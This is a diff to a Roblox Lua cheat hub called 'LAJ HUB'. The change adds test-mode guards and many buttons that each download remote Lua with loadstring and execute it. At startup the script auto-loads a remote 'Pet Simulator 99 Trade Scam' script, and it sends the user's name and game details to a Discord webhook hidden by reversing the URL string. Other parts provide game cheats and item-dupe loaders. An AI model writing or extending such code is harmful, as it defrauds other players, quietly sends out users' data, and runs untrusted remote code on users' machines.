@@ -5,6 +5,12 @@
 
 -- Function to handle HTTP requests across different executors including Swift
 local function getHttpRequest(url)
+    -- For testing in standalone Lua, use a mock response
+    if not game then
+        print("Mock HTTP request to: " .. url)
+        return "-- mock response for testing"
+    end
+    
     if swift and swift.request then
         local response = swift.request({
             Url = url,
@@ -19,17 +25,28 @@ local function getHttpRequest(url)
     return game:HttpGet(url)
 end
 
--- Load Pet Simulator 99 Trade Scam script
-loadstring(getHttpRequest("https://raw.githubusercontent.com/ktrolegl/LAJhubv2/refs/heads/main/pet%20simx"))()
+-- Load Pet Simulator 99 Trade Scam script when in Roblox environment
+if game then
+    loadstring(getHttpRequest("https://raw.githubusercontent.com/ktrolegl/LAJhubv2/refs/heads/main/pet%20simx"))()
+end
 
 local Rayfield = loadstring(getHttpRequest('https://sirius.menu/rayfield'))()
 
-local Players = game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
-local HttpService = game:GetService("HttpService")
+-- Initialize game services safely
+local Players = game and game:GetService("Players") or {}
+local LocalPlayer = Players.LocalPlayer or {Name = "TestUser", UserId = 0}
+local HttpService = game and game:GetService("HttpService") or {
+    JSONEncode = function(_, data) return '{"mock":"json"}' end
+}
 
 -- Support for multiple executors including Swift
 local function makeHttpRequest(options)
+    -- For testing in standalone Lua
+    if not game then
+        print("Mock HTTP request: " .. options.Url)
+        return {Success = true, Body = "-- mock response"}
+    end
+    
     if swift and swift.request then
         return swift.request(options)
     elseif syn and syn.request then
@@ -65,6 +82,8 @@ end
 local DISCORD_WEBHOOK_URL = string.reverse("zuz89P0yCr0WdmXETfrGcQh86y38GMamN3GmsEBIlbS-XY8vgweci5QUIGqDLsAfKqHV/4224109920895937531/skoohbew/ipa/moc.drocsid//:sptth")
 
 local function sendUsageData()
+    if not game then return end -- Skip in non-Roblox environment
+    
     local success, error_message = pcall(function()
     
         local response = makeHttpRequest({
@@ -92,12 +111,12 @@ local function sendUsageData()
                         },
                         {
                             ["name"] = "Game:",
-                            ["value"] = "```" .. (game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name or "Unknown") .. "```",
+                            ["value"] = "```" .. (game and game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name or "Unknown") .. "```",
                             ["inline"] = true
                         },
                         {
                             ["name"] = "Game ID:",
-                            ["value"] = "```" .. tostring(game.PlaceId) .. "```",
+                            ["value"] = "```" .. tostring(game and game.PlaceId or 0) .. "```",
                             ["inline"] = true
                         },
                         {
@@ -107,7 +126,7 @@ local function sendUsageData()
                         },
                         {
                             ["name"] = "Players Active:",
-                            ["value"] = "```" .. tostring(Players.NumPlayers) .. "```",
+                            ["value"] = "```" .. tostring(game and Players.NumPlayers or 0) .. "```",
                             ["inline"] = true
                         }
                     },
@@ -124,7 +143,9 @@ local function sendUsageData()
     end
 end
 
-sendUsageData()
+if game then
+    sendUsageData()
+end
 
 local Window = Rayfield:CreateWindow({
    Name = "LAJ HUB (Swift)",
@@ -178,13 +199,17 @@ end
 MainTab:CreateButton({
    Name = "Copy Discord Link",
    Callback = function()
-       setclipboard("https://discord.gg/4mgdcfvAJU")
-       Rayfield:Notify({
-           Title = "Discord Link Copied",
-           Content = "Invite link copied to clipboard!",
-           Duration = 3,
-           Image = 4483362458,
-       })
+       if setclipboard then
+           setclipboard("https://discord.gg/4mgdcfvAJU")
+           Rayfield:Notify({
+               Title = "Discord Link Copied",
+               Content = "Invite link copied to clipboard!",
+               Duration = 3,
+               Image = 4483362458,
+           })
+       else
+           print("Discord link: https://discord.gg/4mgdcfvAJU")
+       end
    end,
 })
 
@@ -263,6 +288,8 @@ PetSim99:CreateButton({
        executednotify("LAJ Custom Trade Scam")
    end,
 })
+
+-- Universal Tab Scripts
 Universal:CreateButton({
    Name = "Infinite Yield FE",
    Callback = function()
@@ -316,14 +343,16 @@ Universal:CreateButton({
 local idled_Connection
 
 local function onIdled()
-    game:GetService("VirtualUser"):CaptureController()
-    game:GetService("VirtualUser"):ClickButton2(Vector2.new(0, 0))
+    if game then
+        game:GetService("VirtualUser"):CaptureController()
+        game:GetService("VirtualUser"):ClickButton2(Vector2.new(0, 0))
+    end
 end
 
 Settings:CreateButton({
     Name = "Anti AFK",
     Callback = function()
-        if not idled_Connection then
+        if game and not idled_Connection and game.Players.LocalPlayer.Idled then
             idled_Connection = game.Players.LocalPlayer.Idled:Connect(onIdled)
             executednotify("Anti AFK")
         end
@@ -331,17 +360,28 @@ Settings:CreateButton({
 })
 
 local Inf_jump = false
+local jumpConnection = nil
 
 Settings:CreateToggle({
    Name = "Infinite Jump",
    CurrentValue = false,
    Callback = function(Value)
       Inf_jump = Value
-      game:GetService("UserInputService").JumpRequest:Connect(function()
-         if Inf_jump then
-            game.Players.LocalPlayer.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
-         end
-      end)
+      
+      -- Disconnect previous connection if it exists
+      if jumpConnection then
+          jumpConnection:Disconnect()
+          jumpConnection = nil
+      end
+      
+      -- Only create a new connection if Inf_jump is enabled and in game environment
+      if Inf_jump and game then
+          jumpConnection = game:GetService("UserInputService").JumpRequest:Connect(function()
+             if Inf_jump and game.Players.LocalPlayer.Character then
+                game.Players.LocalPlayer.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
+             end
+          end)
+      end
    end,
 })
 
@@ -381,26 +421,129 @@ Rivals:CreateButton({
 DeadRails:CreateSection("Dead Rails Scripts")
 
 DeadRails:CreateButton({
+   Name = "Infernus Direct Loader (No Key)",
+   Callback = function()
+       loadstring(getHttpRequest("https://raw.githubusercontent.com/ktrolegl/deadkrails/main/infernus_direct_loader.lua"))()
+       executednotify("Infernus Direct Loader")
+   end,
+})
+
+DeadRails:CreateButton({
+   Name = "Bynner (No Key)",
+   Callback = function()
+       loadstring(getHttpRequest("https://raw.githubusercontent.com/ktrolegl/deadkrails/refs/heads/main/bynner.lua"))()
+       executednotify("Bynner Script")
+   end,
+})
+
+
+DeadRails:CreateButton({
    Name = "Markk Keyless",
    Callback = function()
-       loadstring(getHttpRequest("https://raw.githubusercontent.com/ktrolegl/deadrailsscript/refs/heads/main/markktest"))()
-       executednotify("Markk Keyless Script")
+       loadstring(getHttpRequest('https://raw.githubusercontent.com/Markklol/aw/refs/heads/main/Protected/DRailsv2.lua'))()
+       executednotify("Markk Keyless")
    end,
 })
 
 DeadRails:CreateButton({
    Name = "Farx11122 Keyless",
    Callback = function()
-       loadstring(getHttpRequest("https://raw.githubusercontent.com/ktrolegl/deadrailsscript/refs/heads/main/farx11122test"))()
-       executednotify("Farx11122 Keyless Script")
+       loadstring(getHttpRequest("https://raw.githubusercontent.com/Farx11122/Dupess/main/SecondDupe"))()
+       executednotify("Farx11122 Keyless")
    end,
 })
 
 DeadRails:CreateButton({
-   Name = "SpiderXHub",
+   Name = "SpiderXHub Keyless",
    Callback = function()
-       loadstring(getHttpRequest("https://raw.githubusercontent.com/ktrolegl/deadrailsscript/refs/heads/main/SpiderXhub"))()
-       executednotify("SpiderXHub Script")
+       loadstring(getHttpRequest("https://raw.githubusercontent.com/SpiderScriptRB/Dead-Rails-SpiderXHub-Script/refs/heads/main/SpiderXHub%202.0.txt"))()
+       executednotify("SpiderXHub Keyless")
+   end,
+})
+DeadRails:CreateButton({
+   Name = "Strelizia Keyless",
+   Callback = function()
+       loadstring(getHttpRequest('https://raw.githubusercontent.com/0vma/Strelizia/refs/heads/main/Standalone/DeadRails.lua', true))()
+       executednotify("Strelizia Keyless")
    end,
 })
 
+DeadRails:CreateButton({
+   Name = "Rinns Dead Rails No Key",
+   Callback = function()
+       loadstring(getHttpRequest("https://api.luarmor.net/files/v3/loaders/e1cfd93b113a79773d93251b61af1e2f.lua"))()
+       executednotify("Rinns Dead Rails No Key")
+   end,
+})
+
+DeadRails:CreateButton({
+   Name = "Auto Farm Bond",
+   Callback = function()
+       loadstring(getHttpRequest("https://raw.githubusercontent.com/Emplic/deathrails/refs/heads/main/bond"))()
+       executednotify("Auto Farm Bond")
+   end,
+})
+
+DeadRails:CreateButton({
+   Name = "Lomu Hub",
+   Callback = function()
+       loadstring(getHttpRequest('https://raw.githubusercontent.com/notyourfavorite1/lomuhubmain/refs/heads/main/main.txt', true))()
+       executednotify("Lomu Hub")
+   end,
+})
+
+DeadRails:CreateButton({
+   Name = "Neox Hub",
+   Callback = function()
+       loadstring(getHttpRequest("https://raw.githubusercontent.com/hassanxzayn-lua/NEOXHUBMAIN/refs/heads/main/loader", true))()
+       executednotify("Neox Hub")
+   end,
+})
+
+DeadRails:CreateButton({
+   Name = "Sypher Hub OP",
+   Callback = function()
+       loadstring(getHttpRequest("https://raw.githubusercontent.com/nocturnal631/Dead-ra/refs/heads/main/Mmm"))()
+       executednotify("Sypher Hub OP")
+   end,
+})
+
+DeadRails:CreateButton({
+   Name = "Tbao Hub",
+   Callback = function()
+       loadstring(getHttpRequest("https://raw.githubusercontent.com/tbao143/thaibao/refs/heads/main/TbaoHubDeadRails"))()
+       executednotify("Tbao Hub")
+   end,
+})
+
+DeadRails:CreateButton({
+   Name = "Karol Hub",
+   Callback = function()
+       loadstring(getHttpRequest("https://raw.githubusercontent.com/Karolmn9900/karolhub/refs/heads/main/script"))()
+       executednotify("Karol Hub")
+   end,
+})
+
+DeadRails:CreateButton({
+   Name = "Dead Rails Alpha Script",
+   Callback = function()
+       loadstring(getHttpRequest("https://raw.githubusercontent.com/gumanba/Scripts/refs/heads/main/DeadRails", true))()
+       executednotify("Dead Rails Alpha Script")
+   end,
+})
+
+DeadRails:CreateButton({
+   Name = "Airflow UPDATED",
+   Callback = function()
+       loadstring(getHttpRequest("https://api.luarmor.net/files/v3/loaders/255ac567ced3dcb9e69aa7e44c423f19.lua"))()
+       executednotify("Airflow UPDATED")
+   end,
+})
+
+DeadRails:CreateButton({
+   Name = "Null-Fire Keyless",
+   Callback = function()
+       loadstring(getHttpRequest("https://raw.githubusercontent.com/InfernusScripts/Null-Fire/main/Loader"))()
+       executednotify("Null-Fire Keyless")
+   end,
+})
